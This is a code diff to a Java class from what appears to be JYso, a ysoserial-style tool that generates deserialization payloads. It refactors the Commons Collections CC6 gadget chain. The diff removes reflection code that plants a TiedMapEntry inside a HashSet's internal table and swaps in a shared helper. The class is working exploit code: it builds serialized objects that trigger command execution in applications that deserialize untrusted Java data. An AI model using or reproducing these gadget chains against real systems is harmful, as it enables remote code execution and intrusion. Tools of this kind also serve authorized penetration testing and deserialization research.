@@ -2,7 +2,6 @@ package com.qi4l.JYso.gadgets;
 
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
-import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -10,10 +9,10 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.io.Serializable;
-import java.lang.reflect.Field;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Map;
+
+import static com.qi4l.JYso.gadgets.AspectJWeaver2.getSerializableCC6;
 
 
 /**
@@ -32,7 +31,7 @@ import java.util.Map;
  * <p>
  * by @matthias_kaiser
  */
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings({"rawtypes","unused"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.MATTHIASKAISER})
 public class cc6 implements ObjectPayload<Serializable> {
@@ -45,43 +44,6 @@ public class cc6 implements ObjectPayload<Serializable> {
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
-        HashSet map = new HashSet(1);
-        map.add("QI4L");
-        Field f = null;
-        try {
-            f = HashSet.class.getDeclaredField("map");
-        } catch (NoSuchFieldException e) {
-            f = HashSet.class.getDeclaredField("backingMap");
-        }
-
-        Reflections.setAccessible(f);
-        HashMap innimpl = (HashMap) f.get(map);
-
-        Field f2 = null;
-        try {
-            f2 = HashMap.class.getDeclaredField("table");
-        } catch (NoSuchFieldException e) {
-            f2 = HashMap.class.getDeclaredField("elementData");
-        }
-
-        Reflections.setAccessible(f2);
-        Object[] array = (Object[]) f2.get(innimpl);
-
-        Object node = array[0];
-        if (node == null) {
-            node = array[1];
-        }
-
-        Field keyField = null;
-        try {
-            keyField = node.getClass().getDeclaredField("key");
-        } catch (Exception e) {
-            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
-        }
-
-        Reflections.setAccessible(keyField);
-        keyField.set(node, entry);
-
-        return map;
+        return getSerializableCC6(entry);
     }
 }
